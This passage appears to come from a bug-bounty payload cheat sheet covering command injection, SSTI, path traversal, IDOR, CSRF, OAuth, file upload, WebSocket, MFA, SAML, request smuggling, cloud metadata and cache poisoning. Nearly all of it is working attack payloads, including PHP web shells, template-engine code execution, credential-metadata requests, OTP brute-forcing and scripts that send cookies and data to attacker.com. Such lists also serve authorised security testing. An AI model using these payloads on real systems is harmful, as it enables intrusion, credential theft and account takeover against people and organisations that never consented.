{"$where": "this.username == 'admin' && this.password.length > 5"}
{"$where": "function() { return this.password.length > 5; }"}

// Object injection
{"user": {"$eq": {"username": "admin"}}}
```

---

## ADVANCED COMMAND INJECTION

### Detection Payloads

```bash
# Basic
; id
| id
`id`
$(id)
&& id
|| id

# Blind confirmation
; sleep 5
| sleep 5
$(sleep 5)
`sleep 5`

# Time-based variations
; sleep 5 #
; ping -c 5 127.0.0.1
; curl http://attacker.com/$(whoami)
```

### Filter Bypass Complete List

```bash
# Space bypass
;{cat,/etc/passwd}
;cat${IFS}/etc/passwd
;cat$IFS/etc/passwd
;IFS=,;cat,/etc/passwd
;cat$(printf '\x20')/etc/passwd

# Newline bypass
;cat
/etc/passwd

# Tab bypass
;cat\t/etc/passwd

# Variable substitution
;$HOME/etc/passwd (if HOME set)
;/bin/cat$IFS/etc/passwd

# Quote bypass
;c'a't /etc/passwd
;c"a"t /etc/passwd

# Backtick bypass
;`cat /etc/passwd`

# Brace expansion
;{cat,/etc/passwd}

# Base64 encode
;echo Y3VwIGV0Yy9wYXNzd2Q= | base64 -d | bash

# Hex encoding
;echo $(printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64') | bash

# PATH manipulation
;PATH=/bin:$PATH;cat /etc/passwd

# Using other binaries
;echo 'cat /etc/passwd' > /tmp/cmd.sh && bash /tmp/cmd.sh

# Windows bypasses
& dir
| type C:\Windows\win.ini
& whoami
; systeminfo
| net user
```

---

## ADVANCED SSTI PAYLOADS

### Engine Detection Payloads

```
{{7*7}}              → 49: Jinja2 (Python), Twig (PHP)
${7*7}               → 49: Freemarker (Java), Spring EL
<%= 7*7 %>           → 49: ERB (Ruby), EJS (Node.js)
#{7*7}               → 49: Mako (Python), Pebble (Java)
*{7*7}               → 49: Spring Thymeleaf
{{7*'7'}}            → 7777777: Jinja2 (Twig gives 49)
```

### RCE Payloads by Engine

**Jinja2 (Python/Flask/Django):**
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
```

**Twig (PHP/Symfony):**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
```

**Freemarker (Java):**
```
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

**ERB (Ruby on Rails):**
```ruby
<%= `id` %>
<%= system("id") %>
<%= IO.popen('id').read %>
```

**Spring Thymeleaf:**
```java
${T(java.lang.Runtime).getRuntime().exec('id')}
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
```

**EJS (Node.js):**
```javascript
<%= process.mainModule.require('child_process').execSync('id') %>
```

---

## ADVANCED PATH TRAVERSAL

### Complete Bypass List

```bash
../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
/etc/passwd%00.jpg
....\/....\/etc/passwd
..\..\..\..\..\..\etc\passwd
%5c..%5c..%5c..%5cetc%5cpasswd
....%2f....%2f....%2fetc%2fpasswd
..;/..;/..;/etc/passwd
..%00/..%00/..%00/etc/passwd
```

### Null Byte Truncation

```bash
/etc/passwd%00.jpg          # PHP < 5.3
/etc/passwd%00%00.jpg       # Some implementations
/etc/passwd%0a              # Newline truncation
/etc/passwd%0d%0a           # CRLF truncation
```

### Encoding Variations

```bash
# Double URL encoding
%252e%252e%252fetc%252fpasswd

# Unicode encoding
%u002e%u002e/etc/passwd
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd

# Mixed encoding
..%2e%2e%5c..%2e%2e%5cetc%5cpasswd
```

---

## ADVANCED IDOR AND AUTH BYPASS

### IDOR Test Matrix

| Test | Payload | Notes |
|------|---------|-------|
| Direct numeric | /api/user/123 → /api/user/124 | Basic |
| UUID swap | /api/user/UUID1 → /api/user/UUID2 | Find UUIDs first |
| Parameter pollution | ?user_id=1&user_id=2 | Last wins sometimes |
| JSON body | {"user_id": 124} | Check PUT/POST bodies |
| GraphQL node | {node(id: "VXNlcjox")} | Base64 encoded |
| Batch | /api/users?ids=1,2,3,4,5 | Bulk endpoints |
| Method swap | GET blocked? Try PUT/DELETE | HTTP verb confusion |
| API version | /api/v2/users/124 → /api/v1/users/124 | Old API often weaker |
| Header injection | X-User-ID: 124 | Check custom headers |
| Cookie manipulation | Set user_id cookie to 124 | Server trusts client cookies |

### Auth Bypass Techniques

```bash
# Missing auth on sensitive endpoints
curl https://target.com/api/admin/users

# Header-based bypass
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/api/admin
curl -H "X-Original-URL: /api/public" https://target.com/api/admin
curl -H "X-Rewrite-URL: /api/public" https://target.com/api/admin
curl -H "X-Host: internal.target.com" https://target.com/api/admin

# Method override
curl -X PUT https://target.com/api/admin/users
curl -X DELETE https://target.com/api/admin/users

# Parameter manipulation
curl "https://target.com/api/users?role=admin"
curl "https://target.com/api/users?admin=true"
curl "https://target.com/api/users?debug=true"
```

---

## ADVANCED CSRF TECHNIQUES

### CSRF PoC Templates

```html
<!-- Basic form CSRF -->
<form action="https://target.com/api/email" method="POST">
  <input name="email" value="attacker@evil.com">
  <input name="password" value="newpass">
</form>
<script>document.forms[0].submit()</script>

<!-- JSON CSRF -->
<form action="https://target.com/api/settings" method="POST">
  <input name='{"settings":{"admin":true}}' value=''>
</form>

<!-- AJAX CSRF (if CORS allows origin) -->
<script>
fetch("https://target.com/api/email", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({email: "attacker@evil.com"})
});
</script>
```

### CSRF Bypass Techniques

```bash
# Check CSRF token validation
# 1. Remove X-CSRF-Token header → does request still work?
# 2. Change token value → still works?
# 3. Use old token from previous session → still works?
# 4. Submit empty token → still works?

# Check SameSite cookie
# SameSite=None + Secure = CSRF possible from any origin
# SameSite=Lax = CSRF possible on top-level navigation
# SameSite=Strict = CSRF protection

# Check Content-Type
# application/x-www-form-urlencoded → CSRF possible
# application/json → CSRF harder but possible with Flash/PDF
```

---

## ADVANCED OAUTH/OIDC ATTACKS

### OAuth Flow Manipulation

```bash
# State parameter bypass
# Remove state parameter entirely
/oauth/authorize?response_type=code&client_id=X&redirect_uri=Y

# State parameter fixed/static
/oauth/authorize?response_type=code&client_id=X&redirect_uri=Y&state=STATIC

# Redirect URI manipulation
/oauth/authorize?response_type=code&client_id=X&redirect_uri=https://target.com/redirect?to=https://evil.com

# Open redirect in redirect_uri
/oauth/authorize?response_type=code&client_id=X&redirect_uri=https://evil.com

# Wildcard redirect
/oauth/authorize?response_type=code&client_id=X&redirect_uri=https://*.target.com
```

### PKCE Bypass

```bash
# Test without code_challenge
/oauth/authorize?response_type=code&client_id=X&redirect_uri=Y

# If server returns 302 without error = PKCE not enforced

# Test with plain challenge (not S256)
code_challenge=plain_challenge_text
code_challenge_method=plain
```

---

## ADVANCED FILE UPLOAD PAYLOADS

### Extension Bypass Complete List

```bash
# Double extension
shell.php.jpg
shell.php%00.jpg
shell.php%00.png

# Case variation
shell.pHp
shell.PHP5
shell.Php7

# Alternative extensions
shell.phtml
shell.phar
shell.shtml
shell.inc
shell.asp
shell.aspx
shell.jsp
shell.jspx
shell.py
shell.pl

# Content-Type spoofing
Content-Type: image/jpeg
[Content: PHP code with GIF89a header]

# Magic bytes
GIF89a; <?php system($_GET['c']); ?>
```

### MIME Type Bypass

```bash
# Send as allowed type, actual content is PHP
Content-Type: image/jpeg
--boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/octet-stream

<?php system($_GET['c']); ?>
--boundary--
```

### Polyglot Files

```bash
# JPEG + PHP polyglot
# Valid JPEG that PHP interpreter also parses as PHP
xxd shell.php.jpg
# Start with: FF D8 FF E0 (JPEG header)
# End with: <?php system($_GET['c']); ?>

# PDF + JS polyglot
# Valid PDF with embedded JavaScript
```

### Path Traversal in Uploads

```bash
# Traversal in filename
../../../../var/www/html/shell.php
..\..\..\..\..\..\shell.php
%2e%2e%2f%2e%2e%2f%2e%2e%2fshell.php

# Null byte truncation
../../../../etc/passwd%00.jpg
```

---

## ADVANCED WEBSOCKET PAYLOADS

### WebSocket Fuzzing

```bash
# Using wscat
wscat -c "wss://target.com/ws"
> {"action":"login","username":"test","password":"test"}
< {"token":"eyJ..."}
> {"action":"subscribe","channel":"private_USER_ID"}
< {"data":"..."}

# Origin bypass
wscat -c "wss://target.com/ws" -H "Origin: https://evil.com"

# CSWSH (Cross-Site WebSocket Hijacking)
# Host on attacker.com:
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => ws.send(JSON.stringify({action:"getAllUsers"}));
ws.onmessage = (e) => fetch('https://attacker.com/steal?d='+encodeURIComponent(e.data));
</script>
```

### WebSocket Injection

```json
// XSS via chat
{"message": "<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>"}

// SQLi via message
{"action": "search", "query": "' OR 1=1--"}

// SSRF via message
{"action": "preview", "url": "http://169.254.169.254/latest/meta-data/"}

// NoSQLi via message
{"username": {"$ne": null}, "password": {"$ne": null}}
```

---

## ADVANCED MFA/2FA BYPASS

### OTP Brute Force

```bash
# 6-digit OTP (1M combinations)
ffuf -u "https://target.com/api/verify-otp" \
  -X POST \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION" \
  -d '{"otp":"FUZZ"}' \
  -w <(seq -w 000000 999999) \
  -fc 400,429 \
  -t 5

# Smart brute force (try sequential, not random)
seq -w 000000 999999 | sort -R > random-otps.txt
ffuf -u "https://target.com/api/verify-otp" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"otp":"FUZZ"}' \
  -w random-otps.txt \
  -t 5
```

### OTP Reuse Attack

```python
import requests

session = requests.Session()
base = "https://target.com"

# Step 1: Get OTP
r1 = session.post(f"{base}/api/send-otp", json={"email": "victim@target.com"})
otp = "123456"  # Intercepted or guessed

# Step 2: Use OTP
r2 = session.post(f"{base}/api/verify-otp", json={"otp": otp})
print(r2.status_code, r2.text)

# Step 3: Logout
session.get(f"{base}/api/logout")

# Step 4: Try same OTP again (replay)
r3 = session.post(f"{base}/api/verify-otp", json={"otp": otp})
print(r3.status_code, r3.text)  # If 200 = OTP reuse vuln
```

### Response Manipulation

```
1. Enter wrong OTP → Burp intercepts response
2. Change: {"success": false, "message": "Invalid OTP"}
   To: {"success": true, "message": "OK"}
3. Forward modified response
4. If app processes it → MFA bypass

Also try:
- Change status code 401 → 200
- Change redirect from /mfa-failed to /dashboard
```

---

## ADVANCED SAML ATTACKS

### XML Signature Wrapping (XSW)

```xml
<!-- Original valid assertion stays, but server processes attacker's assertion -->
<saml:Response>
  <saml:Assertion ID="evil">
    <NameID>admin@company.com</NameID>
    <saml:AttributeStatement>
      <saml:Attribute Name="Role">
        <saml:AttributeValue>admin</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
  <saml:Assertion ID="legit">
    <NameID>user@company.com</NameID>
    <ds:Signature>VALID_SIGNATURE</ds:Signature>
  </saml:Assertion>
</saml:Response>
```

### SAML Token Manipulation

```bash
# Decode SAMLResponse
echo "BASE64_SAML" | base64 -d | xmllint --format - > saml.xml

# Edit NameID to admin
# Re-encode
cat saml.xml | base64 -w0

# Signature stripping
# Remove <ds:Signature> entirely
# Re-encode and submit
# If no signature validation = admin access
```

---

## ADVANCED PROTOCOL PAYLOADS

### HTTP/2 Smuggling

```
# H2.CL desync
# In Burp Repeater, switch protocol to HTTP/2
# Add Content-Length header manually
# Front-end uses HTTP/2 framing, back-end uses Content-Length
# Result: request desync

# H2.TE smuggling
Transfer-Encoding: chunked in HTTP/2 header
# Some backends still process TE header
```

### HTTP Request Smuggling Advanced

```
CL.TE variant:
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

```
TE.CL variant:
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 3

8
SMUGGLED
0

```

---

## ADVANCED IDS/IPS EVASION

### Fragmentation Techniques

```bash
# Split payload across multiple packets
# Nmap fragmentation
nmap -f target.com

# TCP segmentation
# Send payload in small chunks with delays

# HTTP chunked encoding (split body)
Transfer-Encoding: chunked

5
hello
0
```

### Encoding Techniques

```bash
# Double URL encoding
%2527%20OR%201%3D1--

# Unicode encoding
%u0027%20OR%20%u0031%3D%u0031--

# Mixed encoding
%27%20OR%20%31%3D%31--

# Base64
echo "' OR 1=1--" | base64
JycgT1IgMT0xLS0=
```

---

## ADVANCED CLOUD PAYLOADS

### AWS Exploitation

```bash
# S3 bucket listing
aws s3 ls s3://target-bucket --no-sign-request

# S3 bucket file download
aws s3 cp s3://target-bucket/file.txt ./ --no-sign-request

# Public bucket policy check
curl https://target-bucket.s3.amazonaws.com/?policy

# CloudFront misconfig
curl -H "Host: internal.target.com" https://cloudfront-id.cloudfront.net/

# Lambda environment variables (via SSRF)
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### GCP Exploitation

```bash
# Metadata access
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# GCS bucket listing
gsutil ls gs://target-bucket/

# GCS file download
gsutil cp gs://target-bucket/file.txt ./
```

### Azure Exploitation

```bash
# IMDS access
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Blob storage
curl https://account.blob.core.windows.net/container?restype=container&comp=list
```

---

## ADVANCED WEB CACHE PAYLOADS

### Cache Poisoning

```bash
# Unkeyed header poisoning
curl -s https://target.com/page -H "X-Forwarded-Host: attacker.com<script>alert(1)</script>"
curl -s https://target.com/page -H "X-Original-URL: /admin"
curl -s https://target.com/page -H "X-Host: evil.com"

# Parameter cloaking
curl -s "https://target.com/page?param=value;poison=<script>alert(1)</script>"

# Fat GET (body params on GET)
curl -s -X GET "https://target.com/api/endpoint" -d "param=value"

# Web cache deception
curl -s "https://target.com/account/settings.css"
# If auth required but .css extension tricks cache → poisoned
```

---

## ADVANCED BUSINESS LOGIC PAYLOADS

### Price Manipulation

```json
// Negative quantity
{"items": [{"id": "prod1", "qty": -1}]}

// Zero quantity
{"items": [{"id": "prod1", "qty": 0}]}

// Negative price
{"items": [{"id": "prod1", "qty": 1, "price": -100}]}

// Currency manipulation
{"items": [{"id": "prod1", "qty": 1}], "currency": "JPY"}

// Coupon stacking
{"coupons": ["SAVE10", "SAVE20", "SAVE30"]}

// Bulk discount abuse
{"items": [{"id": "prod1", "qty": 1000}]}
```

### Workflow Skip

```bash
# Skip checkout steps
POST /api/checkout/confirm  # Without going through /checkout/shipping

# Race state machine
POST /api/checkout/shipping + POST /api/checkout/confirm (simultaneous)

# Manipulate status
PUT /api/orders/123 {"status": "paid"}
```

---

## FINAL ARSENAL RULES

1. **Test every parameter** — don't skip GET, POST, headers, cookies
2. **Always use two accounts** — cross-user testing is mandatory
3. **Think in chains** — single payloads pay less than chains
4. **Validate before deploying** — test payloads in Burp first
5. **Document everything** — screenshots, requests, responses
6. **Respect rate limits** — don't get blocked
7. **Use the right tool** — ffuf for fuzzing, nuclei for scanning, manual for logic
8. **Stay updated** — payloads evolve as WAFs improve
9. **Never trust automation** — verify every finding manually
10. **Chain A→B→C** — the best bugs are chains, not single findings
